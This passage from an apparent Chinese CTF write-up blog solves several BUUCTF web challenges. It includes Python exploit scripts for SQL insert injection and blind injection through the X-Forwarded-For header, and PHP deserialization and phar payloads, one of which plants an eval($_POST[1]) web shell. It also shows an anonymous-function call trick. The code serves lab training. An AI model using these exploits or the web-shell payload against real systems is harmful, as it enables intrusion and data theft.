class="keyword">new</span> <span class="title function_ invoke__">helper</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>关键文件是helper.php，因为另外2个文件都包含或者是继承自这个文件，我们审计一下：<br>一眼望过去首先就能发现执行sql的insert语句时，没加任何过滤，这里肯定有个注入<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675168440146-ef6e441d-6448-4c57-8458-698a7389072e.png" alt="image.png"><br>然后我注意到了有serialize和unserialize函数：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675168461032-44d37070-d25d-45ad-8b19-68fbf5c9c585.png" alt="image.png"><br>这时候就该思考起是不是反序列化了，在这之前先看一下整个程序的处理逻辑：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675168515870-3f6ee7ef-0019-4839-ad8a-087164f79f9e.png" alt="image.png"><br>首先是upload函数，对上传文件进行处理，期间调用了<code>getfile</code>和<code>save</code>一个个看过去：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675168550122-021e53da-e46c-4c11-a460-ebb47eff335c.png" alt="image.png"><br>getfile又调用了check：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675168561038-5508909c-e84c-4bfa-a9fe-46b94841d715.png" alt="image.png"><br>在check对文件后缀名进行了白名单判断，同时处理了文件名，但是他多返回了一个本应没必要的东西，也就是title，在这里title就是文件原本的名字<br>也就是说我们可以自由控制<code>title</code>参数的内容，也就可以进行注入了，这里当然可以进行sql注入，但是看到了unserialize之后直觉告诉我flag不在数据库中，因此应该想办法去读一下flag，flag假如有的话肯定只能在&#x2F;flag下，同时在代码中提示我们有个未完成的危险函数：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675169044647-dd54a63a-57c0-43c7-903b-15547dd2a732.png" alt="image.png"><br>只需要通过析构函数去调用view_files就可以通过反序列化去读取文件<br>思路就出来了，利用insert注入修改<code>$array[&quot;attr&quot;]</code>的值为自定义序列化字符串，然后再show界面通过unserialize反序列化触发<br>可以开始构造序列化字符串了：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$folder</span> ;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$ifview</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">helper</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里属性是protected类型，从源码中也可以看到一段对%00进行处理的代码：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675169223943-b791f84e-7117-4b46-9112-23cfb69474fe.png" alt="image.png"><br>这里是处理序列化字符串中有%00，也是为我们考虑了，这里写个脚本发包：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#Boogipop</span></span><br><span class="line">url=<span class="string">&quot;http://913b2c6f-66ca-4dcd-bbf3-df235664bbc8.node4.buuoj.cn:81/upload.php&quot;</span></span><br><span class="line">dirty_content=<span class="string">&#x27;O:6:&quot;helper&quot;:3:&#123;s:9:&quot; * folder&quot;;N;s:9:&quot; * ifview&quot;;b:1;s:9:&quot; * config&quot;;s:5:&quot;/flag&quot;;&#125;&#x27;</span></span><br><span class="line">dirty_content=dirty_content.replace(<span class="string">&quot; &quot;</span>,<span class="built_in">chr</span>(<span class="number">0</span>)).encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">dirty_content=<span class="string">&quot;0x&quot;</span>+binascii.b2a_hex(<span class="built_in">bytes</span>(dirty_content)).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">filename=<span class="string">&quot;&#123;&#125;&#x27;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;)#.png&quot;</span>.<span class="built_in">format</span>(dirty_content,dirty_content,dirty_content,dirty_content,dirty_content)</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;upload.png&quot;</span>,<span class="string">&quot;rb+&quot;</span>)</span><br><span class="line">filecontent=f.read()</span><br><span class="line">f.close()</span><br><span class="line"><span class="built_in">print</span>(filename)</span><br><span class="line">file=[(<span class="string">&#x27;file&#x27;</span>,(filename,filecontent,<span class="string">&#x27;image/png&#x27;</span>))]</span><br><span class="line">r1=requests.post(url=url,files=file)</span><br><span class="line"><span class="built_in">print</span>(r1.text)</span><br></pre></td></tr></table></figure>
<p>由于文件名里不能有双引号，如果有双引号的话会直接URL编码，编码之后unserialize就识别不了了，因此我们改为十六进制，发完后就可获得flag</p>
<h2 id="RoarCTF-2019-Online-Proxy"><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h2><p>考点:Insert注入<br>首先放上源码：<br>然后就是思路了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675603230032-f6121fab-c5a9-4d6d-96fa-69a3fa3f95a0.png" alt="image.png"><br>在源代码中显示了ip，这是由x-forwarded-for来控制的，经过测试可以发现存在sql盲注，<code>0&#39;|123|&#39;0</code>，这里利用<code>按位与</code>与0运算后为本身进行盲注，先输入<code>0&#39;|123|&#39;0</code>，然后输入两次<code>111</code>，就可以发现返回了123<br>在这里后台逻辑判断应该是会把我们新的ip插入到后台，然后再次输入不同ip时，把插入结果回显出来<br>有一些UP觉得这是sql二次注入，看了源码后其实就是一个insert盲注<br>然后这里为了避免后台报错，我们将结果转成十进制回显出来，这里贴一个自己写的脚本（写脚本能力有待提高）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#Author: Boogipop</span></span><br><span class="line">s=requests.session();</span><br><span class="line">url=<span class="string">&quot;http://node4.buuoj.cn:27758/&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_len</span>(<span class="params">sql</span>):</span><br><span class="line">    payload = <span class="string">&quot;0&#x27;|length((&quot;</span> + sql + <span class="string">&quot;))|&#x27;0&quot;</span></span><br><span class="line">    s.get(url, headers=&#123;<span class="string">&quot;X-Forwarded-For&quot;</span>: payload&#125;)</span><br><span class="line">    s.get(url, headers=&#123;<span class="string">&quot;X-Forwarded-For&quot;</span>: <span class="string">&quot;Boogipop&quot;</span>&#125;)</span><br><span class="line">    r = s.get(url, headers=&#123;<span class="string">&quot;X-Forwarded-For&quot;</span>: <span class="string">&quot;Boogipop&quot;</span>&#125;)</span><br><span class="line">    content = r.text</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br><span class="line">    res = re.findall(<span class="string">&quot;Last Ip: (.*) --&gt;&quot;</span>, content)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(res[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">executesql</span>(<span class="params">sql</span>):</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,get_len(sql)+<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">        payload=<span class="string">&quot;0&#x27;|conv(hex(substr((&quot;</span>+sql+<span class="string">f&quot;),<span class="subst">&#123;i&#125;</span>,5)),16,10)|&#x27;0&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        s.get(url,headers=&#123;<span class="string">&quot;X-Forwarded-For&quot;</span>:payload&#125;)</span><br><span class="line">        s.get(url,headers=&#123;<span class="string">&quot;X-Forwarded-For&quot;</span>:<span class="string">&quot;Boogipop&quot;</span>&#125;)</span><br><span class="line">        r=s.get(url,headers=&#123;<span class="string">&quot;X-Forwarded-For&quot;</span>:<span class="string">&quot;Boogipop&quot;</span>&#125;)</span><br><span class="line">        content=r.text</span><br><span class="line">        res=re.findall(<span class="string">&quot;Last Ip: (.*) --&gt;&quot;</span>,content)</span><br><span class="line">        res=<span class="built_in">int</span>(res[<span class="number">0</span>])</span><br><span class="line">        res=<span class="built_in">hex</span>(res)</span><br><span class="line">        result+=<span class="built_in">str</span>(<span class="built_in">bytes</span>.fromhex((res.upper())[<span class="number">2</span>:]).decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># sql=&quot;select version()&quot;</span></span><br><span class="line">    sql=<span class="string">&#x27;select group_concat(schema_name ) from information_schema.schemata &#x27;</span></span><br><span class="line">    <span class="comment">#information_schema,ctftraining,mysql,performance_schema,test,ctf,F4l9_D4t4B45e</span></span><br><span class="line">    sql=<span class="string">&quot;select group_concat(table_name) from information_schema.tables where table_schema=&#x27;F4l9_D4t4B45e&#x27;&quot;</span></span><br><span class="line">    sql=<span class="string">&quot;select group_concat(column_name ) from information_schema.columns where table_name=&#x27;F4l9_t4b1e&#x27;&quot;</span></span><br><span class="line">    sql=<span class="string">&quot;select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e&quot;</span></span><br><span class="line">    executesql(sql)</span><br></pre></td></tr></table></figure>
<p>上述脚本处理逻辑中，为什么要用substr呢？因为返回的字符串太长，转换为10进制后，python无法还原QWQ（会出现0xffffffffff爆满），当然你可以在mysql中还原，但是为了脚本的完整性，还是截取了一下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675603494019-21f881ba-76cb-4837-8c10-b6e5167de0ef.png" alt="image.png"></p>
<h2 id="GXYCTF2019-BabysqliV3-0"><a href="#GXYCTF2019-BabysqliV3-0" class="headerlink" title="[GXYCTF2019]BabysqliV3.0"></a>[GXYCTF2019]BabysqliV3.0</h2><p>考点：爆破，phar反序列化<br>看到登录框，和小丑一样的我居然在想能不能sql注入，我真的是谢谢你了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675607298445-ee4fefab-9787-4d23-a745-ac9c3e2e5c85.png" alt="image.png"><br>爆破得出<code>admin/password</code>：<br>接下来进入<code>home.php</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675607328747-2ae8bc8c-1f27-4f30-ad0a-b548002257a1.png" alt="image.png"><br>看到url上有敏感的文件包含点，测试发现只可以包含upload.php,包含其他文件后缀名会被修改为<code>fxxxk</code>,可以用filter读一下upload文件的源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt; </span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">	上传文件</span><br><span class="line">	&lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">	&lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;上传&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$Filename</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$sandbox</span> = <span class="title function_ invoke__">getcwd</span>().<span class="string">&quot;/uploads/&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]).<span class="string">&quot;/&quot;</span>;</span><br><span class="line">		<span class="variable">$ext</span> = <span class="string">&quot;.txt&quot;</span>;</span><br><span class="line">		@<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;Filename = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;Filename = <span class="variable">$sandbox</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>].<span class="variable">$ext</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;echo &#x27;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#x27;;&quot;</span>;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;token = <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">global</span> <span class="variable">$sandbox</span>;</span><br><span class="line">		<span class="keyword">global</span> <span class="variable">$ext</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;[^a-z0-9]&quot;</span>, <span class="variable">$this</span>-&gt;Filename))&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;illegal filename!&#x27;);&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>)&#123;</span><br><span class="line">				<span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;you are too big (′▽`〃)&#x27;);&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;move_uploaded_file(&#x27;&quot;</span>.<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span> . <span class="variable language_">$this</span>-&gt;Filename . <span class="string">&quot;&#x27;);&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">global</span> <span class="variable">$sandbox</span>;</span><br><span class="line">		<span class="keyword">global</span> <span class="variable">$ext</span>;</span><br><span class="line">		<span class="comment">// return $sandbox.$this-&gt;Filename.$ext;</span></span><br><span class="line">		<span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;Filename;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;token != <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>])&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;check token falied!&#x27;);&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$uploader</span> = <span class="keyword">new</span> <span class="title class_">Uploader</span>();</span><br><span class="line">	<span class="variable">$uploader</span>-&gt;<span class="title function_ invoke__">upload</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">	<span class="keyword">if</span>(@<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploader</span>))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;下面是你上传的文件：&lt;br&gt;&quot;</span>.<span class="variable">$uploader</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploader</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>代码很短，一看就知道是phar反序列化，首先我们需要上传我们的phar文件：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&#x27;eval($_POST[1]);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;GXY6d2059a9252630584f3187332dc19abb&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Uploader</span>();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>
<p>这里的token我们可以随便上传一个文件，然后就拿到了，页面会回显上传目录，而所在文件夹的名字就是token，接下里就上传phar文件，这里同时传入name参数：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675607494897-bd601abf-1339-4c8b-824e-b37c13bec9f5.png" alt="image.png"><br>我们需要指定绝对路径，之后再上传一个名字为：<code>phar:///var/www/html/uploads/6343aa0aa076a6547c767ad0a1cd9242/phar.phar</code>的文件，触发phar反序列化即可：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675607536145-6ed330cc-2c99-46b3-8cd5-b12373cf03aa.png" alt="image.png"></p>
<h2 id="SUCTF-2018-annonymous"><a href="#SUCTF-2018-annonymous" class="headerlink" title="[SUCTF 2018]annonymous"></a>[SUCTF 2018]annonymous</h2><p>考点：PHP匿名函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$MY</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&quot;&quot;</span>,<span class="string">&quot;die(`cat flag.php`);&quot;</span>);</span><br><span class="line"><span class="variable">$hash</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">openssl_random_pseudo_bytes</span>(<span class="number">32</span>));</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;function SUCTF_<span class="subst">$hash</span>()&#123;&quot;</span></span><br><span class="line">    .<span class="string">&quot;global \$MY;&quot;</span></span><br><span class="line">    .<span class="string">&quot;\$MY();&quot;</span></span><br><span class="line">    .<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;func_name&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$_GET</span>[<span class="string">&quot;func_name&quot;</span>]();</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p>目的是调用到<code>SUCTF_$hash()</code>这个方法，而这个方法又在一个匿名函数里，PHP里匿名函数的名字有如下规则：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> LAMBDA_TEMP_FUNCNAME  <span class="string">&quot;__lambda_func&quot;</span><span class="comment">/* &#123;&#123;&#123; proto string create_function(string args, string code)   Creates an anonymous function, and returns its name (funny, eh?) */</span>ZEND_FUNCTION(create_function)&#123; ..省略..</span></span><br><span class="line">    function_name = zend_string_alloc(<span class="keyword">sizeof</span>(<span class="string">&quot;0lambda_&quot;</span>)+MAX_LENGTH_OF_LONG, <span class="number">0</span>);    ZSTR_VAL(function_name)[<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;      ZSTR_LEN(function_name) = <span class="built_in">snprintf</span>(ZSTR_VAL(function_name) + <span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="string">&quot;lambda_&quot;</span>)+MAX_LENGTH_OF_LONG, <span class="string">&quot;lambda_%d&quot;</span>, ++EG(lambda_count)) + <span class="number">1</span>;    &#125; <span class="keyword">while</span> (zend_hash_add_ptr(EG(function_table), function_name, func) == <span class="literal">NULL</span>);    RETURN_NEW_STR(function_name);  &#125; <span class="keyword">else</span> &#123;    zend_hash_str_del(EG(function_table), LAMBDA_TEMP_FUNCNAME, <span class="keyword">sizeof</span>(LAMBDA_TEMP_FUNCNAME)<span class="number">-1</span>);    RETURN_FALSE;  &#125;&#125;</span><br></pre></td></tr></table></figure>
<p>上面的源代码中，我们可以看到create_function函数的返回值为\x00lambda_%d，并且实际的本地测试显示匿名函数最终以\x00lambda_1,\x00lambda_2等字符串形式返回。<br>payload：<code>?func_name=%00lambda_1</code></p>
<h2 id="EIS-2019-EzPOP"><a href="#EIS-2019-EzPOP" class="headerlink" title="[EIS 2019]EzPOP"></a>[EIS 2019]EzPOP</h2><p>考点：file_put_contents死亡绕过+套娃</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span 